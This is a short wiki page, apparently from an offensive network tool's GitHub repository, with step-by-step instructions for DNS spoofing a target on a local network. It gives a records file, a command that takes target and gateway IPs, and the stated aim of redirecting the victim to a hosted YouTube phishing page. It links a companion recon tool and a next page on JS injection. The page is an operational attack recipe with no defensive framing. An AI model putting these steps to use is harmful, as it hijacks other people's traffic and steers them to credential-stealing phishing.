# [wiki]::DNS spoofing
<ol>
  <li>Write this to a file:<br><code>{ "mydomain.it.": "192.168.1.113", "otherdomain.com.": "192.168.1.113" }</code></li>
  <li>Discover your target's ip and gateway ip: you can use <a href="https://github.com/n0nexist/subdisc">subdisc</a> for this task.</li>
  <li>Run: <code>sudo python3 main.py [target ip] [gateway ip] dns records.json</code></li>
  <li>New dns requests to mydomain.it and otherdomain.com will make the target go to <code>192.168.1.113</code>,
    where the <a href="https://github.com/n0nexist/Youtube-Phishing-Page">Youtube Phishing Page</a> is being hosted.</li>
</ol>

# Screenshots
![screenshot](https://user-images.githubusercontent.com/111337838/226946833-8b4fb975-a062-4c31-a2d5-e6fcbb10e6cd.png)<br>
![screen2](https://user-images.githubusercontent.com/111337838/226946732-030af7ba-d669-4d48-8270-7fb38d50ea23.jpg)
 
#
<h3>Next wiki page: <a href="https://github.com/n0nexist/Trafficante/blob/main/wiki/js-injection.md">js injection</a></h3>
